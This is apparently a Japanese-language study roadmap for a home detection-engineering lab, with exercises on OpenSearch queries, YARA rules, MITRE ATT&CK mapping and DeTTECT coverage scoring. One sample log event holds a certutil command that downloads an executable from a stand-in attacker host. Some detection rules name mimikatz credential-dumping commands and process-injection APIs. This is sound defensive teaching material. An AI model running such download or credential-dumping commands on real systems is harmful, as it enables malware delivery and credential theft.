# Detection Engineering Learning Roadmap

構築済みの Detection Lab を使って、ログ基盤 → 検知エンジニアリング → DETT&CT 深層理解まで
段階的に進むためのロードマップ。各ステップに「やること」「確認ポイント」「深掘り課題」を設定。

---

## 前提

```bash
cd /Users/takemurashunsuke/SEC/detection_lab
make up       # 全サービス起動
make status   # ヘルスチェック
```

| サービス | URL | 用途 |
|---|---|---|
| OpenSearch | http://localhost:9200 | ログ保存・検索API |
| OpenSearch Dashboards | http://localhost:5601 | 可視化UI |
| DeTTECT Editor | http://localhost:8080 | ATT&CK カバレッジ管理 |
| YARA Scanner API | http://localhost:8081 | 検知エンジン |

---

## LEVEL 0: 環境を動かす（所要: 30分）

### 目標
「コマンド一発で検知ラボが立ち上がる」体験を得る。

### やること

```bash
# 1. Docker Desktop を起動（メモリ 6GB 以上割当）
# 2. ラボを起動
make up

# 3. ヘルスチェック
make status

# 4. サンプルデータを投入
make init

# 5. YARA スキャンを実行
make scan-all
```

### 確認ポイント
- [ ] `make status` で全サービスが Running
- [ ] `curl http://localhost:9200/mordor-events/_count` でドキュメント数 > 0
- [ ] `make scan-logs` で matches_found > 0
- [ ] http://localhost:5601 が表示される

### 深掘り課題
- `docker compose ps` で各コンテナのメモリ使用量を確認
- `docker compose logs opensearch` でログの流れを観察

---

## LEVEL 1: ログの構造を理解する（所要: 1-2時間）

### 目標
「1件のログイベントが何を表しているか」を読めるようになる。

### Step 1.1: Windows イベントログの基本構造

ラボに投入済みの `data/logs/test-events.json` を開き、1行目を読む。

```json
{
  "EventID": 1,
  "CommandLine": "powershell.exe -EncodedCommand ...",
  "ParentImage": "C:\\Windows\\explorer.exe",
  "Image": "C:\\Windows\\System32\\...\\powershell.exe",
  "User": "LABUSER\\admin",
  "Timestamp": "2024-01-15T10:00:00Z"
}
```

覚えるべきフィールド:

| フィールド | 意味 | なぜ重要か |
|---|---|---|
| EventID | イベントの種類番号 | 「何が起きたか」の分類キー |
| Image | 実行されたプロセスのパス | 「誰が動いたか」 |
| ParentImage | 親プロセスのパス | 「誰が起動したか」（プロセスツリー） |
| CommandLine | 実行時の引数 | 「何をしようとしたか」（最重要） |
| User | 実行ユーザー | 「誰の権限で」 |

### Step 1.2: Sysmon Event ID の主要なもの

| Event ID | 名前 | 検知用途 |
|---|---|---|
| 1 | Process Creation | プロセス起動の監視（最頻出） |
| 3 | Network Connection | 外部通信の検知 |
| 7 | Image Loaded | DLL ロードの監視 |
| 10 | Process Access | プロセス間アクセス（LSASS読取等） |
| 11 | File Created | ファイル作成の検知 |
| 12/13 | Registry Event | レジストリ変更の検知 |

### Step 1.3: OpenSearch でログを検索する

```bash
# 全イベント取得（最初の5件）
curl -s 'http://localhost:9200/mordor-events/_search?size=5&pretty'

# CommandLine に "powershell" を含むイベントを検索
curl -s 'http://localhost:9200/mordor-events/_search?pretty' \
  -H 'Content-Type: application/json' \
  -d '{"query": {"match": {"CommandLine": "powershell"}}}'

# EventID=1 のプロセス起動イベントのみ
curl -s 'http://localhost:9200/mordor-events/_search?pretty' \
  -H 'Content-Type: application/json' \
  -d '{"query": {"term": {"EventID": 1}}}'
```

### 確認ポイント
- [ ] test-events.json の各行が「何の攻撃を再現しているか」説明できる
- [ ] OpenSearch Dashboards の Discover タブでログを閲覧できる
- [ ] `match` と `term` クエリの違いが分かる

### 深掘り課題
- OpenSearch Dashboards でインデックスパターン `mordor-events*` を作成し、GUI で検索
- 各イベントの ParentImage → Image の関係を追い、プロセスツリーを紙に書く

---

## LEVEL 2: 検索エンジンの基礎（所要: 2-3時間）

### 目標
OpenSearch のクエリを使って「怪しいイベント」を自力で探せるようになる。

### Step 2.1: 基本クエリパターン

```bash
# --- match: 全文検索（トークン分割される） ---
curl -s 'http://localhost:9200/mordor-events/_search?pretty' \
  -H 'Content-Type: application/json' \
  -d '{"query": {"match": {"CommandLine": "encoded command"}}}'

# --- match_phrase: フレーズ一致（語順を保持） ---
curl -s 'http://localhost:9200/mordor-events/_search?pretty' \
  -H 'Content-Type: application/json' \
  -d '{"query": {"match_phrase": {"CommandLine": "privilege::debug"}}}'

# --- wildcard: ワイルドカード検索 ---
curl -s 'http://localhost:9200/mordor-events/_search?pretty' \
  -H 'Content-Type: application/json' \
  -d '{"query": {"wildcard": {"CommandLine.keyword": "*schtasks*"}}}'

# --- bool: 複合条件（AND/OR/NOT） ---
curl -s 'http://localhost:9200/mordor-events/_search?pretty' \
  -H 'Content-Type: application/json' \
  -d '{
    "query": {
      "bool": {
        "must": [
          {"term": {"EventID": 1}},
          {"match": {"CommandLine": "powershell"}}
        ],
        "must_not": [
          {"match": {"CommandLine": "Get-Help"}}
        ]
      }
    }
  }'
```

### Step 2.2: 集計（Aggregation）

```bash
# CommandLine で使われているプロセス名の上位10件
curl -s 'http://localhost:9200/mordor-events/_search?pretty' \
  -H 'Content-Type: application/json' \
  -d '{
    "size": 0,
    "aggs": {
      "top_images": {
        "terms": {"field": "Image", "size": 10}
      }
    }
  }'
```

### Step 2.3: OpenSearch Dashboards で可視化

1. http://localhost:5601 → Stack Management → Index Patterns
2. `mordor-events*` パターンを作成（Time field: `@timestamp`）
3. Discover タブで KQL クエリを試す:
   - `CommandLine: "powershell" AND EventID: 1`
   - `Image: *mimikatz*`

### 確認ポイント
- [ ] bool クエリの must / should / must_not の違いが分かる
- [ ] Aggregation で「最も多いプロセス」を出せる
- [ ] Dashboards の Discover で自由にフィルタリングできる

### 深掘り課題
- `yara-results` インデックスも Dashboards に追加し、検知結果を可視化
- `mordor-events` と `yara-results` を `technique_id` で突合する方法を考える

---

## LEVEL 3: YARA ルールを読む・書く（所要: 3-4時間）

### 目標
既存の YARA ルールを理解し、自分で新しいルールを書けるようになる。

### Step 3.1: YARA ルールの構文

```
data/yara-rules/log-rules/mimikatz.yar を開いて読む
```

```yara
rule Mimikatz_CommandLine {        // ルール名（一意）
    meta:                          // メタデータ（検索・管理用）
        description = "..."
        technique_id = "T1003.001" // ATT&CK マッピング
        severity = "critical"

    strings:                       // 検索パターン定義
        $m1 = "sekurlsa::logonpasswords" nocase  // nocase = 大小無視
        $m2 = "lsadump::dcsync" nocase

    condition:                     // 発火条件
        any of them               // $m1〜のいずれかにマッチ
}
```

### Step 3.2: condition の書き方パターン

| パターン | 意味 | 使用例 |
|---|---|---|
| `any of them` | 定義した文字列のいずれか | 複数バリエーションの検知 |
| `all of them` | 全ての文字列が存在 | 厳密なマッチ |
| `$a and $b` | 特定の組合せ | 「A かつ B」 |
| `$a and any of ($b*)` | A必須 + Bグループの任意 | 「基本条件+バリエーション」 |
| `#a > 3` | 出現回数が3回超 | 繰返しパターン |
| `uint16(0) == 0x5A4D` | バイナリ先頭2バイト | PE ファイル判定 |

### Step 3.3: 自分でルールを書いてみる

**課題: certutil を使ったファイルダウンロードを検知するルールを書け**

ヒント: `certutil -urlcache -split -f http://... output.exe` がよくある攻撃パターン

```bash
# 1. ルールを作成
#    data/yara-rules/log-rules/certutil_download.yar に保存

# 2. test-events.json にテストイベントを追加
#    {"EventID": 1, "CommandLine": "certutil -urlcache -split -f http://evil.com/mal.exe C:\\temp\\mal.exe", ...}

# 3. ルールをリロード
curl -X POST http://localhost:8081/rules/reload

# 4. スキャンして検知を確認
make scan-logs
```

### Step 3.4: ファイルベース vs ログベースの違い

| 項目 | ファイルベース YARA | ログベース YARA |
|---|---|---|
| 対象 | バイナリ/ファイル | テキストログ（JSON イベント） |
| ルール配置 | `data/yara-rules/file-rules/` | `data/yara-rules/log-rules/` |
| 典型的な用途 | マルウェア検体のシグネチャ | コマンドライン・スクリプトの挙動パターン |
| スキャン | `POST /scan/files` | `POST /scan/logs` |
| 強み | バイナリ構造解析 | 実行時挙動の検知 |

### 確認ポイント
- [ ] 既存の 8 つのログルールの condition を全て説明できる
- [ ] 自作ルールで certutil ダウンロードを検知できた
- [ ] ファイルルールとログルールの使い分けが分かる

### 深掘り課題
- `nocase` を外すとマッチ結果がどう変わるか試す
- 正規表現（`/pattern/`）を使った YARA ルールを書く
- YARA の `pe` モジュールを使ってインポート関数ベースの検知ルールを書く

---

## LEVEL 4: MITRE ATT&CK フレームワークを理解する（所要: 2-3時間）

### 目標
ATT&CK マトリクスの構造を理解し、テクニック ID とログを紐付けられる。

### Step 4.1: ATT&CK の階層構造

```
Tactic（戦術）= 攻撃者の「目的」
  └── Technique（テクニック）= 目的を達成する「手段」
        └── Sub-technique（サブテクニック）= 手段の具体的な「方法」
```

例:
```
Credential Access（認証情報の窃取）          ← Tactic
  └── T1003 OS Credential Dumping           ← Technique
        └── T1003.001 LSASS Memory          ← Sub-technique
```

### Step 4.2: ラボで使用しているテクニック一覧

このラボの DeTTECT 設定に含まれる 15 テクニックを戦術別に整理:

| Tactic | Technique ID | 名前 | ラボでの検知方法 |
|---|---|---|---|
| **Execution** | T1059.001 | PowerShell | YARA ログルール |
| | T1059.003 | Windows Command Shell | Sysmon |
| **Persistence** | T1547.001 | Registry Run Keys | YARA ログルール |
| | T1053.005 | Scheduled Task | YARA ログルール |
| | T1543.003 | Windows Service | Sysmon |
| **Defense Evasion** | T1070.001 | Clear Event Logs | YARA ログルール |
| | T1027 | Obfuscated Files | YARA |
| | T1562.001 | Disable Tools | Sysmon |
| **Credential Access** | T1003.001 | LSASS Memory | YARA ファイル+ログ |
| **Lateral Movement** | T1021.002 | SMB/Admin Shares | YARA ログルール |
| **Initial Access** | T1078 | Valid Accounts | Windows Event Log |
| **Execution** | T1204.002 | Malicious File | YARA ファイルルール |
| **C2** | T1071.001 | Web Protocols | Sysmon |
| **Impact** | T1486 | Data Encrypted | YARA ファイルルール |

### Step 4.3: ATT&CK Navigator で可視化

```bash
# レイヤーファイルを生成
make layers

# 出力ファイルを確認
ls dettect/output/*.json
```

1. https://mitre-attack.github.io/attack-navigator/ にアクセス
2. 「Open Existing Layer」→ `dettect/output/` の JSON ファイルをアップロード
3. 色の濃淡がスコアの高低を表す

### 確認ポイント
- [ ] Tactic / Technique / Sub-technique の階層を説明できる
- [ ] ラボの 15 テクニックが ATT&CK マトリクスのどこに位置するか指差せる
- [ ] Navigator でレイヤーを表示し、カバレッジの濃淡を確認できた

### 深掘り課題
- https://attack.mitre.org/ で T1059.001 の実際のページを読む
- 「Procedure Examples」から実際の APT グループの使用例を3つ調べる
- ラボに無いテクニック（例: T1055 Process Injection）のログをどう取るか考える

---

## LEVEL 5: DeTTECT フレームワーク基礎（所要: 3-4時間）

### 目標
DeTTECT の 3 つの YAML ファイルの関係を理解し、Editor で編集できる。

### Step 5.1: DeTTECT の 3 ファイル構造

```
┌─────────────────────────────┐
│  data-sources-endpoints.yaml │  ← 「何のログを集めているか」
│  (データソース管理)            │     品質スコア付き
└──────────┬──────────────────┘
           │ どのログがどのテクニックに可視性を提供するか
           ▼
┌─────────────────────────────────────┐
│  techniques-administration.yaml      │  ← 「各テクニックをどこまで見えて/検知できるか」
│  (テクニック管理)                      │     visibility + detection スコア
└──────────┬──────────────────────────┘
           │ 脅威アクターのテクニックと自組織の検知力を比較
           ▼
┌─────────────────────────────┐
│  groups.yaml                 │  ← 「どの脅威アクターを想定するか」
│  (グループ管理)               │     使用テクニックのリスト
└─────────────────────────────┘
```

### Step 5.2: DeTTECT Editor で編集

1. http://localhost:8080 にアクセス
2. 「Data Sources」タブ → YAML ファイルをアップロード
3. 各データソースの品質スコアを確認・編集

Editor の操作フロー:
```
YAML アップロード → GUI で編集 → YAML ダウンロード → input/ に保存 → レイヤー再生成
```

### Step 5.3: データ品質スコアの意味

`data-sources-endpoints.yaml` の各データソースに設定されている 5 軸:

| 軸 | 意味 | スコア基準 (0-5) |
|---|---|---|
| device_completeness | 対象デバイスの何%からログが来ているか | 5=全台, 3=半数, 1=一部 |
| data_field_completeness | ログのフィールドがどれだけ揃っているか | 5=全フィールド, 3=主要のみ |
| timeliness | ログの到着遅延 | 5=リアルタイム, 3=分単位, 1=時間単位 |
| consistency | ログ形式の一貫性 | 5=完全統一, 3=概ね統一 |
| retention | ログの保持期間 | 5=1年以上, 3=3ヶ月, 1=1週間 |

### Step 5.4: Visibility vs Detection の違い

| | Visibility（可視性） | Detection（検知力） |
|---|---|---|
| 問い | 「そのテクニックの痕跡がログに残るか？」 | 「その痕跡に対してアラートが上がるか？」 |
| スコア範囲 | 1-4 | -1〜5 |
| 依存先 | データソースの有無と品質 | ルール・ロジックの実装 |
| 例 | Sysmon でプロセス起動が見える → Visibility 3 | YARA ルールで Mimikatz を検知 → Detection 2 |

**重要な関係**: Visibility なしに Detection はあり得ない（見えないものは検知できない）

### 確認ポイント
- [ ] 3 つの YAML ファイルの役割と関係を図で説明できる
- [ ] Editor でデータソースの品質スコアを変更し、YAML をダウンロードできた
- [ ] Visibility と Detection の違いを具体例で説明できる

### 深掘り課題
- データ品質スコアを全て 1 に下げてレイヤーを再生成し、色の変化を観察
- 「Process Creation のデバイスカバレッジが 4→2 に下がった場合」の影響を考える

---

## LEVEL 6: 検知エンジニアリングの実践（所要: 4-6時間）

### 目標
「攻撃テクニックを選び → ログ要件を定義し → 検知ルールを書き → 検証する」
という検知エンジニアリングの一連のサイクルを回せるようになる。

### Step 6.1: 検知エンジニアリングサイクル

```
  ① テクニック選定           ② ログ要件分析
  「何を検知したいか」  →  「何のログが必要か」
        ↑                        ↓
  ⑤ カバレッジ更新          ③ ルール作成
  「DeTTECTスコア更新」  ←  「YARA/検知ロジック」
        ↑                        ↓
        └──── ④ 検証 ←──────────┘
              「サンプルデータで発火確認」
```

### Step 6.2: 実践 — T1055 Process Injection の検知を追加

**① テクニック選定**

現在のラボには T1055 (Process Injection) の検知ルールが無い。
ATT&CK で T1055 を調べ、ログに現れるパターンを特定する。

**② ログ要件分析**

T1055 の検知には以下が必要:
- Sysmon Event ID 8 (CreateRemoteThread)
- Sysmon Event ID 10 (ProcessAccess with specific access masks)
- プロセス名の異常な組合せ（例: explorer.exe → unknown.exe）

**③ ルール作成**

```bash
# 新しい YARA ログルールを作成
cat > data/yara-rules/log-rules/process_injection.yar << 'YARAEOF'
rule CreateRemoteThread_Injection {
    meta:
        description = "Detects CreateRemoteThread-based process injection"
        technique_id = "T1055"
        severity = "high"
    strings:
        $crt1 = "CreateRemoteThread" nocase
        $api1 = "VirtualAllocEx" nocase
        $api2 = "WriteProcessMemory" nocase
        $api3 = "NtMapViewOfSection" nocase
    condition:
        $crt1 or any of ($api*)
}
YARAEOF
```

**④ 検証**

```bash
# テストイベントを追加
echo '{"EventID": 8, "CommandLine": "CreateRemoteThread detected in svchost.exe via VirtualAllocEx", "ParentImage": "C:\\Users\\admin\\malware.exe", "Image": "C:\\Windows\\System32\\svchost.exe", "User": "LABUSER\\admin", "Timestamp": "2024-01-15T11:00:00Z"}' >> data/logs/test-events.json

# ルールリロード & スキャン
curl -X POST http://localhost:8081/rules/reload
make scan-logs

# 結果で technique_id=T1055 のマッチを確認
curl -s 'http://localhost:9200/yara-results/_search?pretty' \
  -H 'Content-Type: application/json' \
  -d '{"query": {"term": {"technique_id": "T1055"}}}'
```

**⑤ カバレッジ更新**

DeTTECT の techniques YAML に T1055 を追加:

```yaml
  - technique_id: T1055
    technique_name: "Process Injection"
    detection:
      - applicable_to: ['all']
        location: ['YARA log rules']
        comment: "CreateRemoteThread pattern detection"
        score_logbook:
          - date: 2024-02-01
            score: 1
            comment: "Basic pattern matching for injection APIs"
    visibility:
      - applicable_to: ['all']
        score_logbook:
          - date: 2024-02-01
            score: 2
```

```bash
# レイヤー再生成
make layers

# Navigator にロードして T1055 が色付きになったことを確認
```

### Step 6.3: 検知の精度を考える

| 用語 | 意味 | ラボでの確認方法 |
|---|---|---|
| True Positive | 攻撃を正しく検知 | test-events の攻撃イベントにマッチ |
| False Positive | 正常を誤検知 | 正常なコマンド（例: 管理者の正規 schtasks）にマッチ |
| False Negative | 攻撃を見逃し | 攻撃イベントにマッチしない |
| True Negative | 正常を正しくスルー | 正常イベントにマッチしない |

**演習**: test-events.json に「正常なスケジュールタスク作成」を追加し、
scheduled_task.yar が誤検知するか確認する。

```json
{"EventID": 1, "CommandLine": "schtasks /create /tn \"GoogleUpdate\" /tr \"C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\" /sc daily", "ParentImage": "C:\\Windows\\System32\\services.exe", "Image": "C:\\Windows\\System32\\schtasks.exe", "User": "SYSTEM", "Timestamp": "2024-01-15T12:00:00Z"}
```

→ これは False Positive になる。ルールの condition をどう改善するか考える。

### 確認ポイント
- [ ] 検知エンジニアリングサイクル（①→⑤）を一周できた
- [ ] T1055 の YARA ルールが正しく発火した
- [ ] DeTTECT の techniques YAML を更新してレイヤーに反映できた
- [ ] False Positive の概念を実例で体験した

### 深掘り課題
- scheduled_task.yar を改良し、正規の Google Update を除外する condition を書く
- ParentImage をルールに組込み「cmd.exe から起動された schtasks のみ検知」にする
- 検知スコアを 1→3 に上げるために何が必要か DeTTECT のスコア基準で考える

---

## LEVEL 7: DeTTECT 深層理解 — カバレッジギャップ分析（所要: 4-6時間）

### 目標
DeTTECT を使って「自組織の検知の穴」を体系的に特定し、優先順位をつけられる。

### Step 7.1: グループオーバーレイ分析

```bash
# グループのテクニックと自組織の検知力を重ね合わせ
make layers-group
```

生成されるレイヤー:
- **赤色**: 脅威アクターが使うテクニックで、自組織が検知 **できない** もの
- **緑色**: 脅威アクターが使うテクニックで、自組織が検知 **できる** もの

→ **赤色のセルが「最優先で対処すべきギャップ」**

### Step 7.2: データソース優先度分析

```bash
# どのデータソースが最も多くのテクニックをカバーするか
docker exec dettect python dettect.py generic -ds
```

この結果から「次に導入すべきデータソース」の優先度が分かる。

| 分析の問い | DeTTECT の機能 |
|---|---|
| 検知できないテクニックは何か？ | Detection レイヤー（スコア 0 or -1 のセル） |
| ログが足りないテクニックは何か？ | Visibility レイヤー（スコア 1 のセル） |
| 脅威アクターとの差分は？ | Group オーバーレイ |
| 最もコスパの良いデータソースは？ | generic -ds の統計 |

### Step 7.3: スコア改善ロードマップの作成

DeTTECT のスコアを上げるための具体的なアクション:

```
Detection Score -1 → 0:  テクニックの存在を認識し、検知計画を立てる
Detection Score  0 → 1:  基本的な検知ルールを作成（例: YARA パターン）
Detection Score  1 → 2:  複数のデータソースを組合せた検知
Detection Score  2 → 3:  コンテキスト付き検知（正常/異常の判別）
Detection Score  3 → 4:  高精度検知 + 自動トリアージ
Detection Score  4 → 5:  自動対応（SOAR連携）まで完備
```

**演習**: ラボのテクニックから Detection Score が最も低いものを 3 つ選び、
スコアを 1 段階上げるための具体的アクションプランを書く。

### Step 7.4: score_logbook による時系列追跡

techniques YAML の `score_logbook` は時系列でスコアの変遷を記録する:

```yaml
score_logbook:
  - date: 2024-01-15
    score: 1
    comment: "Basic YARA pattern only"
  - date: 2024-03-01
    score: 2
    comment: "Added Sysmon correlation + YARA"
  - date: 2024-06-01
    score: 3
    comment: "Context-aware detection with baseline"
```

→ レイヤーを生成するたびに **最新のスコア** が使われる。
→ 過去のレイヤーと比較することで「検知力の成長」を可視化できる。

### 確認ポイント
- [ ] Group オーバーレイで「検知ギャップ」を特定できた
- [ ] データソース優先度分析の結果を解釈できた
- [ ] 3 つのテクニックについてスコア改善アクションプランを書けた
- [ ] score_logbook の時系列管理の意味を理解した

### 深掘り課題
- groups.yaml に実在の APT グループ（例: APT29）のテクニックを追加し、オーバーレイ分析
- 「Visibility スコアは高いが Detection スコアが低い」テクニックを探し、その理由を考察
- 月次レポートとして「前月比での検知カバレッジ改善率」を計算する方法を設計

---

## LEVEL 8: 統合演習（所要: 1日）

### 目標
全レベルの知識を統合し、未知の攻撃シナリオに対して検知戦略を立案・実装・評価できる。

### 演習シナリオ: 「標的型攻撃の検知」

あなたの組織が以下の脅威情報を受け取ったと仮定:

```
脅威アクター: "ShadowPanda"
初期侵入: スピアフィッシング → 悪意ある Office マクロ (T1566.001)
実行: PowerShell ダウンローダー (T1059.001)
永続化: レジストリ Run Key (T1547.001) + スケジュールタスク (T1053.005)
権限昇格: トークン操作 (T1134)
水平移動: WMI (T1047) + PsExec (T1021.002)
情報収集: キーロガー (T1056.001)
持出し: HTTPS 経由 (T1041)
```

### 演習タスク

1. **groups.yaml に ShadowPanda を追加**
2. **カバレッジギャップ分析**: 現在のラボで検知できるテクニックとできないテクニックを分類
3. **不足テクニック用の YARA ルールを 2 つ以上新規作成**
4. **テストイベントを作成し検証**
5. **techniques YAML を更新しスコアを設定**
6. **レイヤーを再生成し改善前後を比較**
7. **検知改善レポートを作成**:
   - 改善前のカバレッジ率（検知可能テクニック数/全テクニック数）
   - 改善後のカバレッジ率
   - 残存ギャップと次のアクション

### 成功基準
- [ ] 8 テクニック中 5 つ以上で Detection Score 1 以上
- [ ] 新規 YARA ルールが全て正しく発火
- [ ] Navigator で改善前後のレイヤーを並べて比較できた
- [ ] 検知改善レポートにギャップと優先度が明記されている

---

## 学習リソース

### 公式ドキュメント
- [MITRE ATT&CK](https://attack.mitre.org/) — テクニックの詳細
- [DeTTECT Wiki](https://github.com/rabobank-cdc/DeTTECT/wiki) — フレームワーク解説
- [YARA Documentation](https://yara.readthedocs.io/) — ルール構文リファレンス
- [OpenSearch Documentation](https://opensearch.org/docs/latest/) — クエリ構文

### サンプルデータ
- [OTRF Security Datasets](https://github.com/OTRF/Security-Datasets) — ATT&CK タグ付き攻撃ログ
- [Mordor Project](https://mordordatasets.com/) — 攻撃シミュレーションデータ

### YARA ルール集
- [Awesome YARA](https://github.com/InQuest/awesome-yara) — YARA リソース集
- [YARA Rules Repository](https://github.com/Yara-Rules/rules) — コミュニティルール

### 検知エンジニアリング
- [Sigma Rules](https://github.com/SigmaHQ/sigma) — 汎用検知ルール形式
- [MITRE Cyber Analytics Repository](https://car.mitre.org/) — ATT&CK ベースの検知分析
